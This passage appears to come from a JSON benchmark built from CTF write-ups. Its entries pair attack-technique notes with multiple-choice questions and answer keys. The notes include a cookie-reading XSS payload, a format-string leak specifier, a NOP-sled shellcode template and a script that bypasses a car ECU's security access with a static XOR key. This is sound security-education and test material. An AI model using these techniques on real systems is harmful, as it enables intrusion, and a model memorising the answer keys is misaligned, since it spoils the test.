            "In scenarios where direct correlation analysis between inputs and outputs of an NLFSR does not yield clear results, a combination of brute force and constraint-based analysis can be applied to deduce missing values. For example, understanding the behavior of specific inputs under known outputs (based on a truth table) facilitates the application of constraints to reduce the brute force search space for other inputs. This method is particularly useful for inputs with a relatively small range of possible values, allowing for an efficient search process.\n\n   Example payload snippet for brute force under constraints:\n   ```python\n   def brute_force_value_B(a, output, constraints):\n       for b in possible_values:\n           # Apply constraint based on A and output\n           if a == 1 and output == 1 and b == 1:\n               return b\n           elif a == 0 and output == 0 and b == 1:\n               return b\n   ```"
        ],
        "question": [
            "When attempting to analyze a NLFSR by calculating a truth table for the equation `(ao * bo) ^ (bo * co) ^ (bo * do) ^ co ^ do`, what characteristic allows for the deduction of input values with high probability? - A. The output is inversely correlated with the value of `ao`. - B. The output is directly correlated with the value of `bo`. - C. There is a strong correlation between the output and the value of `ao`. - D. The output is randomized and shows no correlation with `ao`. ",
            "In a NLFSR cryptographic challenge, if direct correlation analysis between inputs and outputs does not yield clear results, which technique can be effectively used to deduce the value of `B` given specific constraints and known values of `A` and output `O`? - A. Using a random number generator to guess the value of B. - B. Employing a hash function to map inputs to outputs. - C. Applying a combination of brute force and constraint-based analysis to find B. - D. Calculating the mean value of all possible inputs to estimate B. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "nodb",
        "write_up": "dataset/raw/nodb.md",
        "type": "web",
        "competition": [
            "DEFCON/2019/Quals",
            "https://ctftime.org/event/762/tasks/"
        ],
        "score": 118,
        "max_score": 201,
        "difficulty": 0.5870646766169154,
        "knowledge": [
            "When analyzing WebAssembly (Wasm) binaries in Web-based CTF challenges, decompiling the Wasm file can reveal critical functionality details. Tools such as Jae for Wasm decompilation allow for understanding complex logic implemented in Wasm binaries. This can be leveraged to identify variables or conditions crucial for challenge resolution.",
            "Patching Wasm text format (`.wat` files) by modifying constant values or logic conditions can alter the execution flow of the Wasm module. This technique can be utilized to bypass intended checks or to modify the module's output for easier bruteforcing of secrets like passwords or flags. After patching, the `.wat` file must be converted back to a binary `.wasm` file and can be executed within a browser environment to test the modified logic. To bruteforce a password or flag, one can iteratively test characters and monitor the output changes to deduce the correct sequence. \n\nExample modification for bruteforcing assistance: Change a comparison constant `(i32.const 1245)` to a function output `(local.get $variable)` to manipulate execution flow, facilitating the bruteforce process."
        ],
        "question": [
            "In the context of analyzing WebAssembly (Wasm) binaries for vulnerabilities or hidden functionality, which tool is suitable for decompiling Wasm files to better understand the implemented logic?  - A. Jae - B. Ghidra - C. WebAssembly Binary Toolkit (WABT) - D. Binary Ninja ",
            "When attempting to bypass control checks in a Wasm module by altering its execution, which of the following steps is necessary to modify the module's output to aid in the bruteforcing of sensitive information such as passwords?  - A. Converting the `.wasm` file directly to JavaScript for patching - B. Modifying the Wasm binary file using a hexadecimal editor - C. Changing a specific constant value in the `.wat` file to alter the execution flow - D. Rewriting the entire module in a high-level programming language for clarity "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "NoJS",
        "write_up": "dataset/raw/NoJS.md",
        "type": "web",
        "competition": [
            "Square/2022",
            "https://ctftime.org/event/1756/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with web applications that use template engines allowing for HTML injection but have a stringent Content-Security-Policy (CSP) forbidding JavaScript execution (`script-src 'none'`), alternative strategies need to be adopted. Utilizing HTML-based methods to exfiltrate sensitive information without relying on JavaScript, such as employing dangling markup injection to leak contents through styles or metadata, can be effective. This approach is applicable in environments where inline and external CSS or JS are explicitly disallowed by CSP.",
            "In contexts where the application uses `text/template` instead of `html/template`, especially in Go applications, it is critical to note that the former does not sanitize input for HTML output. This behavior can be exploited to perform HTML injection attacks. Attackers can insert arbitrary HTML content into the page, which could potentially include malicious elements designed to exploit other vulnerabilities or exfiltrate data. While a specific payload might vary based on the application's logic and the desired outcome of the attack, understanding the lack of sanitization could lead to strategies for bypassing output encoding mechanisms or directly injecting content that could lead to information disclosure.\n\nExample of exploiting HTML injection without JavaScript:\n\n```html\n<img src=x onerror=alert(document.cookie)>\n```\nNote: Since JavaScript execution is banned by CSP in the challenge's context, the above payload serves as a generic example and would not work under the specified conditions. Instead, focusing on dangling markup or SVG images with external resource references could achieve a similar effect in leaking information."
        ],
        "question": [
            "In a web application that restricts JavaScript execution through Content-Security-Policy (`script-src 'none'`), which method can be used for exfiltrating information without relying on JavaScript? - A. Use an `<img>` tag with an `onerror` attribute to trigger a JavaScript alert. - B. Employ dangling markup injection that can alter layout or reveal sensitive information via styles or metadata. - C. Inject JavaScript directly into HTML elements to bypass CSP restrictions. - D. Utilize inline `<script>` tags to execute JavaScript code.",
            "When a web application uses Go's `text/template` for rendering pages, what is the primary security consideration to keep in mind? - A. `text/template` automatically sanitizes input to prevent Cross-Site Scripting (XSS) attacks. - B. CSP settings are more relaxed when using `text/template`, making it easier to include external resources. - C. The use of `text/template` leads to better performance compared to `html/template`, with no security trade-offs. - D. `text/template` does not sanitize input for HTML output, allowing for arbitrary HTML injection attacks."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "nookstop 2",
        "write_up": "dataset/raw/nookstop 2.0.md",
        "type": "reverse",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": -1.0,
        "max_score": 666,
        "difficulty": -1,
        "knowledge": [
            "When encountering Emscripten WebAssembly (Wasm) binaries in a challenge that are complex and difficult to decompile because of additional external code, rather than trying to reverse engineer the Wasm binary directly, look for hints within the challenge about the nature of the encryption or encoding scheme (like XOR in this scenario). This can lead to alternative approaches to solve the challenge without needing a deep understanding of the binary itself.",
            "If given a corrupted key or partial output that seems to be XOR'ed with the flag, one can try to recover the flag by XOR'ing the known corrupted output with a partial known correct output. This approach works well if the XOR difference is consistent or follows a pattern (e.g., only the lower bits are incorrect). The recovered bits can then be used to guess possible characters of the flag by trying all values that could result from XOR'ing with the known difference. \n\nExample Python snippet to try XOR difference:\n```python\ncorrupted_key = \"wkwcwg{c3oo33os\\x7f\"\nknown_partial_output = \"uiuctf{\"\nxor_diff = [ord(corrupted_key[i])^ord(known_partial_output[i]) for i in range(len(known_partial_output))]\nprint(xor_diff)  # Output the XOR difference to find a pattern\n\n# Assuming the pattern is found and is simple, try to recover possible characters\nfor b in corrupted_key:\n    print(''.join(chr(ord(b) ^ x) for x in range(4)))  # Adjust range if the pattern differs\n```"
        ],
        "question": [
            "When dealing with complex Emscripten WebAssembly binaries in cybersecurity challenges, which approach can provide an alternative to reverse engineering for solving the challenge? - A. Brute force attack all passwords - B. Use a regular expression to match and replace binary code - C. Look for hints in the challenge about the encryption or encoding scheme - D. Write a new WebAssembly binary to replace the existing one",
            "In a situation where you have a corrupted key \"wkwcwg{c3oo33os\\x7f\" from an XOR encryption error and a known part of the correct output \"uiuctf{\", how can you attempt to recover the flag? - A. Use a substitution cipher to substitute each character of the corrupted key with the alphabetically next character - B. Deploy a machine learning model to predict the missing characters - C. XOR the corrupted key with the known correct output and analyze the pattern to guess possible characters for the flag - D. Translate the corrupted key into ASCII values and perform a linear regression analysis to find the correct key"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "not really math",
        "write_up": "dataset/raw/not really math.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 319,
        "max_score": 493,
        "difficulty": 0.6470588235294118,
        "knowledge": [
            "When solving algorithmic challenges where the input must be transformed into a specific format for evaluation, Python's `replace()` function can be effectively used to manipulate strings according to the challenge requirements. This approach is particularly useful when the challenge involves replacing certain characters or substrings to apply mathematical operations or any other logic. For example, in challenges requiring dynamic execution of modified string expressions, replacing characters with mathematical operators and then using `eval()` to compute the result can be a solution.\n   - Example transformation for mathematical expression: `'a'.replace('a', '+').replace('m', ')*(')`, and adding necessary parentheses can convert a custom encoded message into a valid Python expression for evaluation.",
            "To handle challenges that involve repeated interaction with a server, sending and receiving data, the use of libraries like `pwntools` for scripting the interaction can automate the process of fetching challenge inputs and sending responses. This method is especially useful in \"Capture The Flag\" (CTF) competitions for automating tasks against network services. \n   - Example snippet for automated communication: \n     ```python\n     from pwn import *\n     conn = remote('hostname', port)\n     conn.recvline()  # For receiving a line of data from the server\n     conn.sendline('data')  # For sending responses or data back to the server\n     ```"
        ],
        "question": [
            "In a CTF challenge involving string manipulation for algorithmic computation, consider a scenario where you need to convert a given string into a mathematical expression by replacing certain characters with mathematical operators. If the original string needed to transform \"abcdefg\" into a valid mathematical expression, which Python line of code correctly applies the transformation described, changing 'a' to '+' and 'm' to ')*(' while ensuring the expression is properly wrapped with parentheses for evaluation? - A. `new_str = 'a'.replace('a', '+')` - B. `new_str = 'abcdefg'.replace('a', ')*(').replace('m', '+')` - C. `new_str = '((' + 'abcdefg'.replace('a', '+').replace('m', ')*(') + '))'` - D. `new_str = 'abcdefg'.replace('a', '+').replace('m', ')*(')` ",
            "When tasked with solving a challenge that requires continuous interaction with a remote server, which Python snippet most accurately represents the process of automatically communicating with the server, assuming you need to read a line of data sent by the server and then respond with \"answer\"? - A. `print('data')` - B. ```python import socket s = socket.socket() s.connect(('hostname', port)) ``` - C. ```python from pwn import * conn = remote('not-really-math.hsc.tf', 1337) conn.recvline() conn.sendline('answer') ``` - D. ```python import requests response = requests.get('http://hostname') ``` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Not so Ez Reversing",
        "write_up": "dataset/raw/Not so Ez Reversing.md",
        "type": "reverse",
        "competition": [
            "0xL4ugh/2021",
            "https://ctftime.org/event/1248/tasks/"
        ],
        "score": -1,
        "max_score": 825,
        "difficulty": -1,
        "knowledge": [
            "When reverse engineering binaries to understand encryption or encoding mechanisms, it is effective to use decompilers like Ghidra for making sense of C++ binaries. Decompilers can significantly simplify complex binary structures into a more understandable form of code, thus accelerating the analysis process.",
            "In scenarios where a program relies on pseudo-random number generation (PRNG) for functionality like encryption, it\u2019s crucial to remember that PRNG results can differ across operating systems due to differences in the implementation of the `rand()` function. This discrepancy can affect reproducibility and decryption efforts. To ensure accurate decryption or analysis, one must execute or simulate the PRNG behavior on the same operating system as the target binary or application.\n\nExample payload for re-generating the random values considering the PRNG discrepancies:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(void){\n  // Ensure this is executed in the same OS environment as the original program\n  srand(0);  \n  for(int i=0; i<file_size; ++i){ // Assume 'file_size' is the accurate size of data\n    printf(\"%i,\", rand()%4);  \n  }  \n  return 0;  \n}\n```"
        ],
        "question": [
            "When attempting to understand the functionality of a compiled C++ binary through static analysis, which tool is most beneficial for simplifying the code into a more readable format? - A. A hex editor to directly interpret the binary's hexadecimal representation. - B. A compiler to recompile the binary into its source code. - C. A decompiler like Ghidra for converting compiled code back into a high-level readable format. - D. A debugger to step through the binary execution one instruction at a time.",
            "Why is it important to consider the operating system when working with a program that relies on the `rand()` function for pseudo-random number generation, especially in the context of replicating encryption or decryption mechanisms? - A. Because the `rand()` function generates more random values on Linux compared to Windows, enhancing security. - B. Because the seed value provided to `srand()` has different effects on Windows and Linux, altering the start of the random sequence. - C. Because the implementation of `rand()` differs across operating systems, leading to different sequences of numbers for the same seed value. - D. Because `rand()` function can only be used in Linux environments, making it incompatible with Windows."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "nothing more to say",
        "write_up": "dataset/raw/nothing more to say.md",
        "type": "pwn",
        "competition": [
            "TokyoWesterns/2020",
            "https://ctftime.org/event/1086/tasks/"
        ],
        "score": -1.0,
        "max_score": 478,
        "difficulty": -1,
        "knowledge": [
            "When encountering a format string vulnerability in a binary with ASLR applied only to elements other than the binary itself (e.g., stack, libc), use the vulnerability to leak stack pointers by crafting a specific payload that includes format specifiers (e.g., `%41$lx`) to target and leak a specific QWORD in memory. This is useful for calculating the exact buffer or variable address in memory by the offset difference between the leaked pointer and the target memory address.\n   - Example payload: `%41$016lx`",
            "When dealing with a stack buffer overflow vulnerability in a binary where protections like SSP, NX, and PIE are disabled, and after obtaining a precise buffer address through a memory leak (as described above), one can craft a payload that overflows the buffer with a NOP sled followed by shellcode, then overwrites the return address with the address of the NOP sled (buffer address calculated from the leaked pointer). This approach enables execution of arbitrary code despite ASLR by using a two-step exploitation process: first, exploiting the format string vulnerability to leak addresses, and second, executing the shellcode via stack buffer overflow.\n   - Example payload conceptual template: `\"\\x90\"*NOP sled size + shellcode + struct.pack(\"<Q\", calculated buffer address)`\n   - Note: This template needs to be adjusted based on the shellcode and the exact address of the buffer, which is calculated as `leaked address - offset`."
        ],
        "question": [
            "In a CTF challenge, you've encountered a binary with ASLR enabled only for elements other than the binary itself (e.g., the stack and libc). You've identified a format string vulnerability that you plan to use to leak a stack pointer. To do this, you need to craft a payload that targets and leaks a specific QWORD in memory. Assuming you know the exact position of the QWORD relative to your format string in the printf's arguments list, which of the following payloads would correctly target and leak the address of the 41st QWORD in memory? - A. `%41$p` - B. `%41$016lx` - C. `%41$s` - D. `41#x` ",
            "You're exploiting a stack buffer overflow vulnerability in a CTF challenge. The binary has no stack canaries (SSP), NX-bit, and PIE are disabled, making it possible to execute shellcode directly from the stack. After leaking a stack pointer through a format string vulnerability, you've calculated the exact address of your buffer. To exploit the binary, how should you craft your payload to correctly execute your shellcode through stack buffer overflow considering ASLR is enabled for the stack? - A. Use the leaked address directly with shellcode - B. Craft a payload with NOPs leading to shellcode, followed by the return address - C. Place shellcode at the beginning of the payload, followed by the address of the shellcode on the stack - D. Craft a payload with a NOP sled, append the shellcode, and overwrite the return address with the calculated buffer address "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "notifico",
        "write_up": "dataset/raw/notifico.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 215,
        "max_score": 500,
        "difficulty": 0.43,
        "knowledge": [
            "When facing CTF challenges involving file permissions and program execution behavior, the use of `inotify` can be a critical aspect to consider. `inotify` is a Linux kernel subsystem that acts to extend filesystems to notice changes to the filesystem, and it's used to monitor file activities. Understanding how `inotify` works can be essential in challenges where the script or program reacts to file system events, particularly those involving regular and symlink file types. In such scenarios, manipulating file system events (like opening or modifying files) can trigger specific behaviors in the program, which could be exploited to achieve a desired outcome, such as manipulating the result of a script to return a specific exit code.",
            "Solving complex puzzles in CTF challenges, such as the N queens problem, can be approached algorithmically by generating systematic solutions through scripting. The N queens problem is a well-known puzzle that involves placing N queens on an N\u00d7N chessboard so that no two queens threaten each other. This problem can analogously represent scenarios in CTF challenges, where an arrangement of certain elements (like file permissions or specific files) must meet particular conditions without conflicts. Utilizing existing algorithms or adapting them to generate all possible solutions can help in iterating through potential configurations until the correct one is found. Scripting this process in languages like Python or C and leveraging mathematical or logical problem-solving techniques allows for efficient decryption or uncovering of hidden information based on the challenge's constraints.\n\nSample Python snippet to change solution to UNIX permissions and SHA-256 hash for decryption attempts:  \n\n```python\n# This Python snippet is an abstract example and may require context-specific adjustments\nimport os\nimport hashlib\nfrom queens import generate_solutions  # Assuming \"queens.py\" provides a function to generate solutions\n\ndef apply_permissions(solution, base_dir):\n    for i, row in enumerate(solution):\n        for j, is_queen in enumerate(row):\n            file_path = os.path.join(base_dir, f'dir_{i}', f'file_{j}')\n            if is_queen:\n                os.chmod(file_path, 0o700)\n            else:\n                os.chmod(file_path, 0o400)\n\ndef hash_directory(base_dir):\n    hasher = hashlib.sha256()\n    for root, dirs, files in os.walk(base_dir):\n        dirs.sort()\n        files.sort()\n        for fname in files:\n            file_path = os.path.join(root, fname)\n            with open(file_path, 'rb') as f:\n                hasher.update(f.read())\n    return hasher.hexdigest()\n\n# Example usage\nsolution = generate_solutions(15)  # Generating a 15x15 N queens solution\napply_permissions(solution[0], './solution_dir')  # Applying permissions based on the first solution\nhashed_solution = hash_directory('./solution_dir')\nprint(f'SHA-256 hash of the solution directory: {hashed_solution}')\n```\n\nThis snippet exemplifies how to convert a logical solution (e.g., the N queens puzzle) into a series of file permission changes, then hashing the directory for attempts at decrypting or verifying the solution against a challenge condition."
        ],
        "question": [
            "When analyzing the executable `check` in a CTF challenge, it was found to utilize `inotify` to monitor file operations in directories. Given this scenario, which of the following operations would NOT trigger `inotify` to increment its counter based on the provided `check` behavior?  - A. Creating a new symlink in a watched directory. - B. Opening and closing a regular file in write mode without modifying its contents. - C. Modifying the contents of a regular file and then closing it. - D. Changing the permissions of a regular file from read-only to read-write. ",
            "In the context of solving the N queens problem for a CTF challenge, which approach efficiently generates all possible solutions to systematically alter UNIX permissions for decryption or verification purposes?  - A. Creating a single-threaded Python script that iterates over each position on the board using recursion. - B. Manually placing queens on the board while ensuring none are in a position to attack each other. - C. Utilizing an existing C program adapted from Rosetta Code to systematically generate all solutions to the N queens problem. - D. Attempting brute force solutions by randomly placing queens on the board until a valid configuration is found. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Not_Baby_Fixed",
        "write_up": "dataset/raw/Not_Baby_Fixed.md",
        "type": "crypto",
        "competition": [
            "PBjar/2021",
            "https://ctftime.org/event/1430/tasks/"
        ],
        "score": 409,
        "max_score": 500,
        "difficulty": 0.818,
        "knowledge": [
            "When faced with a large RSA modulus n that is difficult to factor directly, look for information or equations related to how n is constructed. If n is derived from an equation involving multiple variables, factor these variables first if their values are known or can be derived. This approach can simplify the equation, breaking down n into smaller, more manageable factors for prime factorization. This technique is particularly useful when direct factorization of n is impractical due to its size. \n\nExample application: If n = a^3 + b^3 - 34c^3 and the values of a, b, and c are known, factor a, b, and c to rewrite n in a simplified form that is easier to factor.",
            "For the RSA decryption process, calculating the Euler's totient function phi(n) can sometimes be simplified when the prime factors of n and their exponents are known. In cases where the primes do not have exponents greater than 1, phi can be simply calculated by multiplying (p-1) for each prime p. However, when primes do have exponents greater than 1, phi must be calculated considering the exponent. The correct formula for a prime p with exponent e is phi(p^e) = p^(e-1) * (p-1). This knowledge is critical for accurately computing phi and, subsequently, the decryption exponent d in RSA.\n\nExample calculation for a prime p with exponent e: phi(p^e) = p^(e-1) * (p-1), where p is a prime factor of n and e is its exponent."
        ],
        "question": [
            "When attempting to factor a large RSA modulus \\(n\\) that cannot be directly factored due to its size, and given the equation \\(n = a^3 + b^3 - 34c^3\\) with known values of \\(a\\), \\(b\\), and \\(c\\), what is the first step in simplifying the process? - A. Use a brute-force approach to directly factor \\(n\\). - B. Rewrite \\(n\\) in terms of its prime factors \\(p\\) and \\(q\\). - C. Factor \\(a\\), \\(b\\), and \\(c\\) to rewrite the equation in a simplified form that is easier to factor. - D. Ignore the provided equation and use quantum computing algorithms to factor \\(n\\).",
            "In the context of decrypting RSA where \\(n = pq\\) and both \\(p\\) and \\(q\\) have been found to be prime, if \\(p\\) is discovered to have an exponent greater than 1 in the factorization of \\(n\\), how is Euler's totient function \\(\\phi(n)\\) correctly computed? - A. \\(\\phi(n) = n - 1\\) - B. \\(\\phi(n) = (p - 1)(q - 1)\\) - C. \\(\\phi(p^e) = p^{e-1} \\times (p-1)\\) where \\(p\\) is a prime factor of \\(n\\) and \\(e\\) is its exponent. - D. \\(\\phi(n) = (p^e - 1) \\times (q^e - 1)\\) for all \\(e > 1\\)."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Now We Can Play!!",
        "write_up": "dataset/raw/Now We Can Play!!.md",
        "type": "crypto",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "In ElGamal encryption scheme challenges, if one has access to ciphertext components and the public key parameters but not the private key, one can still retrieve the plaintext by exploiting relationships between these components and using the fact that the private key is used similarly in both encryption and decryption processes. This involves rearranging the provided formulas and applying the modular multiplicative inverse operation. A decryption formula in such scenarios can be simplified to \\(m = c2 \\times inverse(pow(c1, sk, p)) \\mod p\\), where \\(sk\\) is the secret key, and \\(c1\\), \\(c2\\), and \\(p\\) are given.",
            "If the decryption function introduces a random value that affects the plaintext outcome, and if this randomness operates within a known, finite range, one can perform a brute force attack to recover the original plaintext by iterating through all possible values of the random factor. This is feasible if the range of values is relatively small, as seen with the rand value varying between \\(2^{16}\\) and \\(2^{17}\\). The knowledge of the message format (e.g., printable characters) can assist in validating the correctness of the brute-forced plaintext. In ElGamal and similar cryptographic schemes, the formula for brute-forcing based on randomness could be summarized as \\(m = m_ \\times inverse(pow(3, rand, p)) \\mod p\\), given that \\(m_\\) is the modified message received.\n\nExample brute force snippet (context-specific):\n``` python\nfor rand in range(2**16, 2**17):\n    m_attempt = m_ * inverse(pow(3, rand, p), p) % p\n    if is_printable(m_attempt):\n        print(\"Found flag:\", m_attempt)\n        break\n```"
        ],
        "question": [
            "In the context of an ElGamal encryption scheme where the encryption process uses variables `c1`, `c2`, and `p` as part of its mechanism, which formula correctly represents the decryption process to recover plaintext `m` without the private key, given that `sk` is the secret key used in both encryption and decryption?  - A. \\(m = c2 + inverse(pow(c1, sk, p)) \\mod p\\) - B. \\(m = c2 \\times pow(c1, -sk, p) \\mod p\\) - C. \\(m = c2 - pow(c1, sk, p) \\mod p\\) - D. \\(m = c2 \\times inverse(pow(c1, sk, p)) \\mod p\\) ",
            "Considering an ElGamal decryption scenario where an additional random factor `rand` ranging between \\(2^{16}\\) and \\(2^{17}\\) alters the output, making direct decryption challenging. Which approach best describes the method to recover the original plaintext `m` using brute force, given `m_` as the plaintext modified by the random factor?  - A. Iterate `rand` from \\(2^{16}\\) to \\(2^{17}\\), computing \\(m = m_ - pow(3, rand, p) \\mod p\\) until finding a printable `m`. - B. Iterate `rand` from \\(2^{16}\\) to \\(2^{17}\\), computing \\(m = m_ + inverse(pow(3, rand, p), p) \\mod p\\) until finding a printable `m`. - C. Iterate `rand` from \\(2^{16}\\) to \\(2^{17}\\), computing \\(m = m_ \\times pow(3, -rand, p) \\mod p\\) until finding a printable `m`. - D. Iterate `rand` from \\(2^{16}\\) to \\(2^{17}\\), computing \\(m = m_ \\times inverse(pow(3, rand, p), p) \\mod p\\) until finding a printable `m`. "
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "NPC",
        "write_up": "dataset/raw/NPC.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": -1,
        "max_score": 320,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving encrypted secrets with hints suggesting that components of the password are constructed from specific sets of words (e.g., words from the US Constitution), constructing a trie data structure filled with these word options significantly aids in filtering through potential passwords. The trie allows for an efficient exploration of possible word combinations by ensuring each trial is a prefix of or a complete valid word from the set. This approach is particularly useful when dealing with large word sets and complex concatenation or encryption puzzles.",
            "When a challenge provides a graph-based hint for decrypting or constructing a password, where the graph's vertices and edges represent components of the password and their concatenation order respectively, and includes additional constraints like random edges or directional reversals, converting the graph into an undirected version can simplify the solution process. This allows for the implementation of a backtracking algorithm that explores all possible paths, ensuring that each step adheres to specific rules (e.g., forming valid words from a trie). This technique is useful for puzzles where deciphering the correct path through provided or manipulated data structures leads to the solution."
        ],
        "question": [
            "In a cryptography challenge, the decryption key for a secret message is a password composed of words from the US Constitution. The decryption process is significantly improved by using a specific data structure to efficiently test if a sequence of characters can form valid words from the given word list. Which data structure is best suited for filtering potential passwords by ensuring each character sequence is a prefix of or a complete valid word?  - A. Binary search tree - B. Linked list - C. Trie - D. Hash map ",
            "In a graph-based puzzle aimed at constructing a password, the original directed graph includes additional random edges and reversible edges, complicating the password recovery process. A solution approach involves converting this graph into a more manageable form, allowing for simplified backtracking and exploration of all possible paths according to given rules. What is this essential first step in simplifying the graph to facilitate the application of a backtracking algorithm?  - A. Converting the graph into an undirected graph. - B. Applying Dijkstra's algorithm to find the shortest path. - C. Transforming the graph into a weighted graph. - D. Implementing a depth-first search without modification. "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "NRC",
        "write_up": "dataset/raw/NRC.md",
        "type": "web",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "When a web challenge appears to restrict user interactions (e.g., disabling right-click), alternative methods such as using keyboard shortcuts (Ctrl+Shift+C for Chrome's Developer Tools) can circumvent these restrictions and allow exploration of the application's elements and source code.",
            "Examining CSS, JavaScript, or other static files linked to the website can reveal comments or hardcoded strings that may contain hints or the flag itself. This strategy can be particularly effective when direct interaction with the website's main functionalities is limited or obfuscated."
        ],
        "question": [
            "In a web challenge where right-click functionality is disabled, preventing access to the browser's context menu, which keyboard shortcut can be used to directly open the Developer Tools in Google Chrome, allowing the user to inspect the page's elements and potentially find hidden information? - A. Ctrl + F12 - B. Alt + Shift + I - C. Ctrl + Shift + C - D. Shift + F10",
            "If upon inspecting the source files of a web challenge, you come across a CSS file with comments hinting towards the solution or containing part of the flag, this approach falls under which of the following web vulnerability analysis techniques? - A. Cross-site scripting (XSS) exploitation - B. SQL injection attack - C. Directory traversal - D. Sensitive information exposure through misconfigured files"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "NT master",
        "write_up": "dataset/raw/NT master.md",
        "type": "pwn",
        "competition": [
            "m0leCon/2020/Quals",
            "https://ctftime.org/event/1025/tasks/"
        ],
        "score": -1,
        "max_score": 449,
        "difficulty": -1,
        "knowledge": [
            "When facing challenges that require timely responses, automate the data submission process using scripts. Python, combined with libraries such as pwntools, is effective for interacting with network services in real-time challenges. This method ensures that submissions are made within stringent time constraints.",
            "In challenges related to mathematical conditions or equations, simplifying the conditions may present a straightforward solution. For instance, if the problem requires finding values a and b such that their greatest common divisor (gcd) and least common multiple (lcm) sum up to a given number N, and a > b > 0, consider simple arithmetic decompositions of N that satisfy the conditions. A practical example is decomposing N into (N-1) + 1, assuming N > 2, which satisfies the given mathematical requirement without the need for complex algorithms or libraries.\n\nSample of payload in the context of the challenge:\n```python\nconn.sendline('%s %s' % (num-1, 1))\n```"
        ],
        "question": [
            "When dealing with a Capture the Flag challenge that requires submitting answers within a limited time frame, which Python library paired with the provided code snippet would be most suitable for automating interactions with network services?  ```python from pwn import * from helpers import bytes_to_string import re  if __name__ == \"__main__\": pattern = r'\\d+' try: conn = remote('challs.m0lecon.it', 10000) c = bytes_to_string(conn.recv()) num = int(re.findall(pattern, c)[-1]) conn.sendline('%s %s' % (num-1, 1)) for i in list(range(1,11)): conn.recvline() c = bytes_to_string(conn.recvline()) print(c) num = int(re.findall(pattern, c)[-1]) conn.sendline('%s %s' % (num-1, 1)) except EOFError: pass ``` - A. requests - B. scapy - C. pwntools - D. numpy ",
            "In a mathematical challenge where the sum of the greatest common divisor (gcd) and least common multiple (lcm) of two numbers a and b must equal a specific number N, with the constraints a > b > 0, which simple arithmetic decomposition of N satisfies the given conditions?  ```python conn.sendline('%s %s' % (num-1, 1)) ```  - A. Decompose N into (N/2) + (N/2) - B. Decompose N into (N) + 0 - C. Decompose N into (N-1) + 1, assuming N > 2 - D. Decompose N into (1) + (N-1) "
        ],
        "answer": [
            "C. pwntools",
            "C. Decompose N into (N-1) + 1, assuming N > 2"
        ]
    },
    {
        "name": "OBD Tuning 1",
        "write_up": "dataset/raw/OBD Tuning 1.md",
        "type": "The type of challenge in this CTF write-up is **forensics**.",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with automotive cybersecurity, particularly CAN (Controller Area Network) protocols, analyzing UDS (Unified Diagnostic Services) commands within a PCAP dump can reveal useful processes relevant to penetration testing or ethical hacking of car systems. These include initiating diagnostic sessions (10 02), requesting security access via a challenge (27 01), providing a security access response (27 02), and reading data by Common Identifier (22 00 00). These commands are crucial for interacting with the Electronic Control Unit (ECU) to extract sensitive information or carry out functions, wrapped in ISO-TP (ISO 15765-2) as the underlying transport protocol.",
            "In scenarios of cryptographic challenge-response systems, particularly those encountered in automotive systems security, a viable method to bypass or satisfy the security mechanism is through operations such as XOR on the provided challenge with a discovered static key. Upon analyzing network traffic (e.g., a PCAP file) and identifying a pattern or a static key used in the XOR operation for the response, this key can be used to craft responses to future challenges posed by the system. This approach allows for unauthorized access to protected functionalities, such as reading specific data identifiers for potential exfiltration of secure information.\n\nExample payload for crafting a response in Python based on observed XOR key:\n```python\n# Assuming we have already obtained the challenge from the ECU\nchallenge_hex = \"670167987F8A8248B127A411253FE49EB8EE\"  # Sample challenge in hex\nchallenge_int = int(challenge_hex, 16)  # Convert to integer for XOR operation\nkey = 0x34323432343234323432343234323432  # Discovered XOR key\n\n# Calculate response using XOR\nresponse = challenge_int ^ key\n\n# Prepare and send the response back to the ECU\nresponse_hex = hex(response)[2:]  # Convert response back to hex, removing the '0x' prefix\n# Subsequent code would send this response back as part of the security access process\n```"
        ],
        "question": [
            "In an automotive cybersecurity context, when analyzing a PCAP dump containing UDS commands, which UDS command pair is specifically used for initiating a diagnostic session? - A. 22 00 00 - Read Data By CommonIdentifier - B. 27 01 and 27 02 - Security access \"send challenge\" and \"response\" - C. 10 02 - Init diagnostic session - D. 27 01 - Security access \"send challenge\" only ",
            "In a cryptographic challenge-response system used in automotive security, when a static key is discovered through analysis of network traffic for the response to a challenge, what operation is commonly performed to craft a valid response based on the observed strategy in the write-up? - A. Adding the challenge with the static key - B. Performing a bitwise XOR of the challenge with the static key - C. Subtracting the static key from the challenge - D. Performing a bitwise AND of the challenge with the static key "
        ],
        "answer": [
            "C. 10 02 - Init diagnostic session",
            "B. Performing a bitwise XOR of the challenge with the static key"
        ]
    },
    {
        "name": "Obey The Rules",
        "write_up": "dataset/raw/Obey The Rules.md",
